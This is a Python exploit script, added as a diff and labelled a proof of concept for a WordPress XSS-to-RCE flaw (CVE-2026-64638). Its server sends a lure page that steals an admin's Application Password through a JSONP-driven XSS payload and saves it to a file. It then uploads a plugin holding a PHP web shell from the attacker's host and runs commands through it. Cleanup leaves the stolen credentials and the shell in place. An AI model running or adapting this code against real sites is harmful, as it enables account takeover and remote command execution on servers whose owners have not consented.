@@ -1,0 +1,572 @@
+#!/usr/bin/env python3
+import argparse
+import base64
+import io
+import json
+import os
+import socket
+import sys
+import threading
+import time
+import urllib.parse
+import urllib.request
+import uuid
+import zipfile
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+BANNER = r"""
+ __          __           _  _____           
+ \ \        / /          | |/ ____|          
+  \ \  /\  / /__  _ __ __| | (___   ___  ___ 
+   \ \/  \/ / _ \| '__/ _` |\___ \ / _ \/ __|
+    \  /\  / (_) | | | (_| |____) |  __/ (__ 
+     \/  \/ \___/|_|  \__,_|_____/ \___|\___|
+                                              
+                                              
+xss2shell & CVE-2026-64638 |  https://wordsec.net/ - Education Purpose Only
+
+"""
+
+UA = "WordSec (https://wordsec.net/ | Education Purpose Only; XSS2Shell PoC)"
+
+PLUGIN_SLUG = "xss2shell"
+APP_NAME = "XSS2Shell-Poc-Wordsec"
+CREDS_FILE = "xss2shell_creds.json"
+
+G = {
+    "site": None,
+    "origin": None,
+    "success_url": None,
+    "app_id": None,
+    "blogname": "WordPress",
+    "delay_ms": 3000,
+    "steps": [],
+    "step_set": set(),
+    "captured": None,
+    "published": None,
+}
+
+STEP_MSG = {
+    "lure_loaded": "[+] Victim opened the attacker page (session-expired lure)",
+    "opener_loaded": "[+] Exploit started in the victim's browser",
+    "child_written": "[+] Child popup document initialized",
+    "child_ready": "[+] Popup window ready, XSS payload prepared",
+    "submit_sent": "[+] XSS payload POSTed to wp-login.php",
+    "upload_started": "[+] Plugin ZIP upload request sent with the victim's session",
+}
+
+
+def set_step(name, msg=""):
+    if name not in G["step_set"]:
+        G["step_set"].add(name)
+        G["steps"].append((name, msg))
+
+
+def load_creds(site=None):
+    try:
+        with open(CREDS_FILE) as f:
+            data = json.load(f)
+    except Exception:
+        return None
+    saved_site = data.get("site") or data.get("site_url")
+    if site and saved_site and saved_site != site:
+        return None
+    return data
+
+
+def save_creds(creds):
+    creds = dict(creds)
+    creds["saved_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
+    if not creds.get("shell_url"):
+        creds["shell_url"] = (creds.get("site_url") or "").rstrip("/") \
+            + f"/wp-content/plugins/{PLUGIN_SLUG}/shell.php"
+    try:
+        with open(CREDS_FILE, "w") as f:
+            json.dump(creds, f, indent=2)
+        print(f"[+] Application Password saved to {CREDS_FILE} for later runs "
+              f"(shell: {creds['shell_url']})")
+    except Exception as e:
+        print(f"[*] could not save credentials to {CREDS_FILE}: {e}")
+
+
+def http_get(url):
+    req = urllib.request.Request(url, headers={"User-Agent": UA})
+    try:
+        with urllib.request.urlopen(req, timeout=20) as r:
+            return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+    except Exception as e:
+        raise
+
+
+def http_json(url, data=None, headers=None, method=None):
+    h = dict(headers or {})
+    h.setdefault("User-Agent", UA)
+    req = urllib.request.Request(
+        url,
+        data=(json.dumps(data).encode() if data is not None else None),
+        headers=h,
+        method=method,
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=20) as r:
+            return json.loads(r.read().decode())
+    except urllib.error.HTTPError as e:
+        body = e.read().decode("utf-8", "replace")
+        try:
+            return json.loads(body)
+        except Exception:
+            return {"_http_error": e.code, "_body": body[:500]}
+
+
+def basic_auth_header(user_login, password):
+    token = base64.b64encode(f"{user_login}:{password}".encode()).decode()
+    return {"Authorization": "Basic " + token, "Content-Type": "application/json"}
+
+
+def shell_alive(shell_url):
+    try:
+        r = http_json(shell_url + "?cmd=" + urllib.parse.quote("id"))
+        return bool(r.get("rce"))
+    except Exception:
+        return False
+
+
+def build_opener_page():
+    import html
+    origin = G["origin"]
+    site = G["site"]
+    delay = int(G["delay_ms"])
+    payload = (
+        "< area id=ajaxurl href=/?rest_route=/&_method=GET"
+        "&_jsonp=window.opener.approve.click&_envelope=1>"
+        "< div id=color-picker class=reset-pass-submit>"
+        '< button class="wp-generate-pw color-option">X'
+    )
+    value = html.escape(payload, quote=True)
+    return """<!doctype html>
+<html><head><meta charset="utf-8"><title>XSS2Shell</title></head>
+<body><script>
+(function () {
+  var ORIGIN = %(origin)r;
+  var SITE = %(site)r;
+  var SUCCESS = %(success)r;
+  var APP_ID = %(app_id)r;
+  var APP_NAME = %(app_name)r;
+  var LOG_VALUE = %(value)r;
+  var DELAY = %(delay)s;
+  function beacon(k, v) { new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k) + '&msg=' + encodeURIComponent(v || ''); }
+  function child_content() {
+    return '<!doctype html><meta charset="utf-8"><title>XSS2Shell - child</title>'
+      + '<form id="f" method="post" action="' + SITE + '/wp-login.php">'
+      + '<input type="hidden" name="log" value="' + LOG_VALUE + '">'
+      + '<input type="hidden" name="pwd" value="x">'
+      + '</form>'
+      + '<scr' + 'ipt>'
+      + 'function b(k,v){new Image().src="' + ORIGIN + '/beacon?step="+encodeURIComponent(k)+"&msg="+encodeURIComponent(v||"");}'
+      + "b('child_ready');"
+      + "setTimeout(function(){b('submit_sent');document.getElementById('f').submit();}," + DELAY + ");"
+      + '</scr' + 'ipt>';
+  }
+  function run() {
+    beacon('opener_loaded');
+    var child = null;
+    try { child = window.open('about:blank', 'xss2child'); } catch (e) {}
+    if (!child) { beacon('popup_blocked'); return; }
+    try {
+      child.location.href = ORIGIN + '/child';
+      beacon('child_written');
+    } catch (e) { beacon('child_error', String(e)); }
+    location.href = SITE + '/wp-admin/authorize-application.php' +
+      '?app_name=' + encodeURIComponent(APP_NAME) +
+      '&app_id=' + APP_ID +
+      '&success_url=' + encodeURIComponent(SUCCESS);
+  }
+  run();
+})();
+</script></body></html>
+""" % {"origin": origin, "site": site, "success": G["success_url"],
+       "app_id": G["app_id"], "app_name": APP_NAME, "value": value,
+       "delay": delay}
+
+
+def build_child_page():
+    import html
+    origin = G["origin"]
+    site = G["site"]
+    delay = int(G["delay_ms"])
+    payload = (
+        "< area id=ajaxurl href=/?rest_route=/&_method=GET"
+        "&_jsonp=window.opener.approve.click&_envelope=1>"
+        "< div id=color-picker class=reset-pass-submit>"
+        '< button class="wp-generate-pw color-option">X'
+    )
+    value = html.escape(payload, quote=True)
+    return """<!doctype html>
+<html><head><meta charset="utf-8"><title>XSS2Shell - child</title></head>
+<body><form id="f" method="post" action="%(site)s/wp-login.php">
+<input type="hidden" name="log" value="%(value)s">
+<input type="hidden" name="pwd" value="x">
+</form><script>
+(function () {
+  var ORIGIN = %(origin)r;
+  var DELAY = %(delay)s;
+  function b(k,v) { new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k) + '&msg=' + encodeURIComponent(v || ''); }
+  b('child_ready');
+  setTimeout(function () {
+    b('submit_sent');
+    document.getElementById('f').submit();
+  }, DELAY);
+})();
+</script></body></html>
+""" % {"origin": origin, "site": site, "value": value, "delay": delay}
+
+
+def build_callback_page(fallback=None):
+    origin = G["origin"]
+    site = G["site"]
+    published_js = (
+        "(async function(){"
+        "var B='%s';" % origin
+        + "var ZIP='%s';" % (origin + "/payload.zip")
+        + "function b(k,v){new Image().src=B+'/beacon?step='+encodeURIComponent(k)+'&msg='+encodeURIComponent(v||'');}"
+        + "try{"
+        + "b('upload_started');"
+        + "var zip=await(await fetch(ZIP)).arrayBuffer();"
+        + "var html=await(await fetch('/wp-admin/plugin-install.php?tab=upload')).text();"
+        + "var m=html.match(/name=\"_wpnonce\" value=\"([^\"]+)\"/);"
+        + "if(!m){document.title='ERR_NONCE';b('upload_result','ERR_NONCE');return;}"
+        + "var fd=new FormData();"
+        + "fd.append('_wpnonce',m[1]);"
+        + "fd.append('pluginzip',new Blob([zip]),'xss2shell.zip');"
+        + "await fetch('/wp-admin/update.php?action=upload-plugin',{method:'POST',body:fd});"
+        + "document.title='UPLOADED';b('upload_result','UPLOADED');"
+        + "}catch(e){document.title='ERR:'+e;b('upload_result','ERR:'+e);}"
+        + "location.href='/wp-admin/';"
+        + "})();"
+    )
+    head = "<script>" + published_js
+    fallback_js = ""
+    if fallback:
+        fallback_js = "  var FALLBACK = %(fallback)s;\n" % {"fallback": json.dumps(fallback)}
+        user_line = "  var user = qs.get('user_login') || (FALLBACK && FALLBACK.user_login);"
+        pass_line = "  var pass = qs.get('password') || (FALLBACK && FALLBACK.password);"
+    else:
+        user_line = "  var user = qs.get('user_login');"
+        pass_line = "  var pass = qs.get('password');"
+    return """<!doctype html>
+<html><head><meta charset="utf-8"><title>XSS2Shell - callback</title></head>
+<body><script>
+(function () {
+  var ORIGIN = %(origin)r;
+  var site = %(site)r;
+  var qs = new URLSearchParams(location.search);
+  %(fallback_js)s
+  %(user_line)s
+  %(pass_line)s
+  function beacon(k, v) { new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k) + '&msg=' + encodeURIComponent(v || ''); }
+  if (!pass) { document.body.textContent = 'no application password captured'; beacon('publish_error', 'no password'); return; }
+  var content = %(head)s + '</scr' + 'ipt>';
+  fetch(site + '/wp-json/wp/v2/pages', {
+    method: 'POST',
+    headers: { 'Authorization': 'Basic ' + btoa(user + ':' + pass), 'Content-Type': 'application/json' },
+    body: JSON.stringify({ title: 'xss2shell-' + Date.now(), status: 'publish', content: content })
+  }).then(function (r) { return r.json(); }).then(function (obj) {
+    if (obj && obj.link) { beacon('publish_ok', obj.link); beacon('page_id', String(obj.id)); location.href = obj.link; }
+    else { document.body.textContent = 'publish failed: ' + JSON.stringify(obj); beacon('publish_error', JSON.stringify(obj)); }
+  }).catch(function (e) { beacon('publish_error', String(e)); });
+})();
+</script></body></html>
+""" % {"origin": origin, "site": site, "head": json.dumps(head), "fallback_js": fallback_js,
+       "user_line": user_line, "pass_line": pass_line}
+
+
+def build_plugin_zip():
+    main_php = "<?php\n/**\n * Plugin Name: XSS2Shell PoC\n * Version: 1.0.0\n */\n"
+    shell_php = (
+        "<?php\n"
+        "if ( isset( $_REQUEST['cmd'] ) ) {\n"
+        "    header( 'Content-Type: application/json' );\n"
+        "    echo json_encode( array( 'rce' => true, 'output' => shell_exec( $_REQUEST['cmd'] ) ) );\n"
+        "    exit;\n"
+        "}\n"
+        "http_response_code( 404 );\n"
+    )
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr(f"{PLUGIN_SLUG}/{PLUGIN_SLUG}.php", main_php)
+        z.writestr(f"{PLUGIN_SLUG}/shell.php", shell_php)
+    return buf.getvalue()
+
+
+class Handler(BaseHTTPRequestHandler):
+    server_version = "WordSec/1.0"
+
+    def log_message(self, *args):
+        pass
+
+    def _reply(self, code, body, ctype="text/plain"):
+        self.send_response(code)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Server", "WordSec")
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_OPTIONS(self):
+        self._reply(204, b"")
+
+    def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        qs = urllib.parse.parse_qs(parsed.query)
+        if parsed.path == "/":
+            self._reply(200, build_opener_page().encode(), "text/html")
+        elif parsed.path == "/child":
+            self._reply(200, build_child_page().encode(), "text/html")
+        elif parsed.path == "/callback":
+            fallback = None
+            qpass = qs.get("password", [""])[0]
+            if qpass:
+                G["captured"] = {
+                    "site_url": qs.get("site_url", [""])[0],
+                    "user_login": qs.get("user_login", [""])[0],
+                    "password": qpass,
+                }
+                save_creds(G["captured"])
+                set_step("password_captured",
+                         f"[+] Application Password stolen: user={G['captured']['user_login']} "
+                         f"pass={G['captured']['password']} (saved to {CREDS_FILE})")
+            else:
+                fallback = load_creds(G["site"])
+                if fallback:
+                    G["captured"] = fallback
+                    print(f"[*] no fresh capture; reusing saved Application Password "
+                          f"(user={fallback['user_login']})")
+            self._reply(200, build_callback_page(fallback).encode(), "text/html")
+        elif parsed.path == "/beacon":
+            name = qs.get("step", [""])[0]
+            msg = qs.get("msg", [""])[0]
+            if name == "publish_ok":
+                G["published"] = {"link": msg}
+            elif name == "page_id":
+                G["published"] = dict(G["published"] or {}, id=msg)
+            set_step(name, msg)
+            self._reply(200, b"ok")
+        elif parsed.path == "/payload.zip":
+            body = build_plugin_zip()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/zip")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(body)
+        elif parsed.path == "/state":
+            self._reply(200, json.dumps(
+                {"steps": G["steps"], "captured": G["captured"], "published": G["published"]}
+            ).encode(), "application/json")
+        else:
+            self._reply(404, b"not found")
+
+
+def get_lan_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def start_server(host="0.0.0.0", port=0):
+    srv = ThreadingHTTPServer((host, port), Handler)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    return srv
+
+
+def print_steps(seen, steps):
+    for name, msg in steps:
+        key = (name, msg)
+        if key in seen:
+            continue
+        seen.add(key)
+        if name == "page_id":
+            continue
+        if name == "password_captured":
+            print(msg)
+        elif name == "publish_ok":
+            print(f"[+] Attacker page published: {msg}")
+        elif name == "publish_error":
+            print(f"[!] ERROR: failed to publish page: {msg}")
+        elif name == "upload_result":
+            if msg == "UPLOADED":
+                print("[+] Plugin ZIP uploaded, shell.php is web-accessible")
+            elif msg.startswith("ERR_NONCE"):
+                print(f"[!] ERROR: plugin upload nonce not found (upload form may differ): {msg}")
+            elif msg.startswith("ERR:"):
+                print(f"[!] ERROR: plugin upload failed: {msg}")
+            else:
+                print(f"[*] Upload status: {msg}")
+        elif name == "popup_blocked":
+            print("[!] ERROR: browser blocked the popup (pop-up blocker)")
+        elif name in STEP_MSG:
+            print(STEP_MSG[name])
+        else:
+            print(f"[*] {name}: {msg}")
+
+
+def main():
+    print(BANNER)
+    print("=" * 60)
+    print("[*] XSS2Shell starting ...")
+
+    ap = argparse.ArgumentParser(
+        description="XSS2Shell - CVE-2026-64638 (WordPress < 7.0.3) Pre-auth XSS -> RCE",
+        add_help=True,
+    )
+    ap.add_argument("-t", "--target", required=True,
+                    help="target WordPress base URL (e.g. http://wordpress.research.local)")
+    ap.add_argument("-c", "--command", required=True,
+                    help="command to run on the server (e.g. id)")
+    ap.add_argument("--lhost", default=None,
+                    help="attacker IP to bind and advertise "
+                         "(default: 0.0.0.0 with auto-detected LAN IP)")
+    ap.add_argument("--lport", type=int, default=0,
+                    help="attacker TCP port (default: random)")
+    ap.add_argument("--keep", action="store_true", help="do not clean up artifacts")
+    args = ap.parse_args()
+
+    site = args.target.rstrip("/")
+    if not site.startswith(("http://", "https://")):
+        ap.error("target must start with http:// or https://")
+
+    G["site"] = site
+    G["app_id"] = str(uuid.uuid4())
+
+    saved = load_creds(site)
+    if saved:
+        print(f"[*] Found saved Application Password from a previous run "
+              f"(user={saved['user_login']}), will reuse it if the fresh capture fails")
+
+    print(f"[*] Checking target: {site}/wp-login.php")
+    try:
+        status, body = http_get(site + "/wp-login.php")
+    except Exception as e:
+        print(f"[!] ERROR: admin panel not found - wp-login.php unreachable ({e})")
+        sys.exit(1)
+    if status != 200 or "user_login" not in body:
+        print(f"[!] ERROR: admin panel not found (wp-login.php returned HTTP {status}, "
+              "no WordPress login form)")
+        sys.exit(1)
+    print(f"[+] Admin panel found: {site}/wp-login.php")
+
+    try:
+        info = http_json(site + "/wp-json/")
+        if isinstance(info, dict) and info.get("name"):
+            G["blogname"] = info["name"]
+    except Exception:
+        pass
+
+    if args.lhost and args.lhost != "0.0.0.0":
+        bind_host = args.lhost
+        lan_ip = args.lhost
+    else:
+        bind_host = "0.0.0.0"
+        lan_ip = get_lan_ip()
+
+    srv = start_server(bind_host, args.lport)
+    _, port = srv.server_address
+    G["origin"] = f"http://{lan_ip}:{port}"
+    G["success_url"] = f"http://{lan_ip}:{port}/callback"
+    url = G["origin"] + "/"
+    shell_url = f"{site}/wp-content/plugins/{PLUGIN_SLUG}/shell.php"
+
+    print(f"[+] Attacker server listening: {lan_ip}:{port}")
+    print("[*] On the target website, the admin must open this page and log in:")
+    print(f"    ->  {site}/wp-login.php")
+    print("[*] Then the admin opens the link that was sent to them:")
+    print(f"    ->  {url}")
+    print("[*] Waiting for the admin to visit (Ctrl+C to stop) ...")
+
+    seen = set()
+    got_shell = False
+
+    try:
+        while True:
+            st = {}
+            try:
+                st = http_json(f"{G['origin']}/state")
+            except Exception:
+                pass
+            print_steps(seen, st.get("steps") or [])
+
+            if shell_alive(shell_url):
+                got_shell = True
+                break
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print("\n[*] Interrupted by user - stopping.")
+        creds = G.get("captured") or load_creds(site)
+        if not args.keep and creds:
+            cleanup(site, creds, G["published"], G["app_id"], shell_url)
+        srv.shutdown()
+        sys.exit(0)
+
+    if not got_shell:
+        names = {s[0] for s in G["steps"]}
+        if "opener_loaded" not in names:
+            print("[!] ERROR: attacker page never opened - the admin did not visit "
+                  "the URL or access was blocked")
+        elif "password_captured" not in names:
+            print("[!] ERROR: XSS request blocked or failed - target may be patched "
+                  "(7.0.3+) or REST/JSONP blocked")
+        elif "publish_ok" not in names:
+            print("[!] ERROR: page was not published - REST request may have been blocked")
+        elif "upload_result" not in names:
+            print("[!] ERROR: plugin upload did not complete - admin session may have "
+                  "ended or the upload was blocked")
+        else:
+            print("[!] ERROR: shell unreachable - server may not execute PHP or shell.php is blocked")
+        creds = G.get("captured") or load_creds(site)
+        if not args.keep and creds:
+            cleanup(site, creds, G["published"], G["app_id"], shell_url)
+        srv.shutdown()
+        sys.exit(1)
+
+    print(f"[+] Shell reachable: {shell_url}")
+
+    result = http_json(shell_url + "?cmd=" + urllib.parse.quote(args.command))
+    out = result.get("output")
+    print("\n" + "=" * 60)
+    print("[+] Command output:")
+    print(out.strip() if out else "(no output)")
+    print("=" * 60)
+
+    creds = G.get("captured") or load_creds(site)
+    if not args.keep and creds:
+        cleanup(site, creds, G["published"], G["app_id"], shell_url)
+
+    print(f"\n[+] Shell link: {shell_url}?cmd=whoami")
+    print("[+] Done.")
+    srv.shutdown()
+
+
+def cleanup(site, captured, published, app_id, shell_url):
+    if not captured:
+        print("[*] Cleanup: no credentials captured, skipped")
+        return
+    headers = basic_auth_header(captured["user_login"], captured["password"])
+    if published and published.get("id"):
+        try:
+            http_json(f"{site}/wp-json/wp/v2/pages/{published['id']}?force=true",
+                      method="DELETE", headers=headers)
+            print(f"[*] Cleanup: published page deleted (id={published['id']})")
+        except Exception as e:
+            print(f"[*] Cleanup: could not delete page: {e}")
+    print("[*] Cleanup: Application Password, plugin shell, and saved credentials preserved")
+
+
+if __name__ == "__main__":
+    main()
